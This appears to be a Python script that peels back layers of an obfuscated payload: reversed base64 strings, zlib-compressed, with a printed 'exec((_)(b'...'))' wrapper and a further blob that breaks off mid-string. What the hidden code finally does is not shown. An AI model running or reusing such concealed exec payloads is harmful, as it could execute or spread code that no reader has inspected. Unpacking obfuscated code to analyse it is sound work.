import zlib
import base64

s = (b'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')

b64 = base64.b64decode(s[::-1])
print(zlib.decompress(b64))

#b"exec((_)(b'=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'))"

s2 = b'=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'
b64 = base64.b64decode(s2[::-1])
print(zlib.decompress(b64))

#b'=Q2+U56F8L0v2EH3ZpdZ29uzOleXMb/BRKP8j4V/2z6wHyQyO4h1DNsscADdZuKdS+N8rKcuW1H5fW6+yL2bqwrIwkWhDGjssQn9mWaUOxHtPEHaik/3+dJZ0a0s8qV0RpCOiKe/hV8qAAUmHMU5zus69X9O0HrrBhCODYS75zb07gg7qFk2JvrfXZpqOIf2raXw9b3YZlNhruWfnKSZAd0jZQCYkrAytCutocV4Iw71T+gjGQ/nUnCpoYZOp1Kp0IovPkFUMpoS+SFSrYdMo3QbfgfRGgUyTDa1hIOcEj7fG+yZCqpGGQ2E+PA/fqEl0FGGjHG4SNXGmI9QI+a2PEZc21Zc081IikTui4CpbcK/S5FLTT0xsjcl4vEJDbLmwlp5jC80y1piAs7Na2A0EI7bKREJRhbDvq1JEmZZGgC3oPmPh5HwXUPG0dOmssjknQbPFiQZLhniwtoliQec++yYDEvsixOyyIk5OwH6mtf488idv8a3d25odPazIu8y6rJ+Gq25h9yUnSYvuTgcmWxBKykwBioQ+1ZkuXQfciibA2JgtDp0P0m2fYZajh8P0GZNHkEFavzvn8nwUtxbmbaIZc46AcloeoNwpfxFO1rh6Tf5+sDIAS50ztyGgsjMjEJtChD4acIv2s0Yw19i1A4jad3ycIopRKsDvbp73oUFQdgq2Br+rvS3auQtDpScq7xy8C0s0bViyp0KXhkFddJi1YsXmF2cVoARnrB6xRmpmTBCo9IgMQr9Tsf65Y0NERsiRBnRyQ2pMfGoYoDpwGGgSHlYcPhKfAXXKD7ojP20AS9dF4LFCF0BCXxPTGgRkBNPShUFobFV2g41iAf0BID8D5gBhcFbUDyZ2MQbSSrYWA0MW22lADlKpe0g3bFF2/fOWPGjQIzwEUjPDBMZ1CTiXNwnYV3CSOj+nIKXIPNjzoQQiZPFLKySuKO4woxXclWwI9uVvBQjEgQaZCZOAibCTGWYPp1cbNTtTCgr2BJeN2bBJpXwHZ6+v6eYK5hILg3QyQpAmSPrCcEOd1+s/lhLAteAdCg9AQgADl3EHsfzLh+kZn0C6qyQhs573ff9QOLshPljy0JLo2GNZkQ7RAUs1EtLq5RIeypHjpz0VqH7ia4OKtwVLEE9XEFqSZCO72znvRFE4dJBmN2xYeamfn2zXH9fMkOSFZKj8m5VUByMyG8C8qn54gkAvYw/5svk6SUypSCLCGyLk+omU8jU1FhTX+IuLX0cLMCXOiRELAqIVEDW1fqRMetZ9QRCtrbvmW6FLxFWevHnl1IVJwfMkevktzVSg4JfEztuEJ8PMD9odtIVTGMdFizCqTR9r602ksomegcSs73iYy16RQtLJPlvK+gMLHRjYANs3YxPnQQbMl27rRaxhKOUocnc7UeRw2DXghIEOJSYkBzGza8ETljkpsmmsfuIX8p0ICUMCMruOpHn5T3ArLPPJ/UgG09pkx+895hd7wN08f/eSprlgdhFy06ZRSn+ivatNE2lncvs8PsTY2yMFpxILzGbveXEIWxIPuCVuX02IxtSpSnkGBqgPeBPffQdE1JC86RWKki38wZnffpz6uToZLIRtkhkrM8I8FjLb3q/L9sI3oTUduMZY9Mq7hDZ0sOocOlXuSVHo4JhLmw2P4SZq8o1CLEqreDGmALhF3f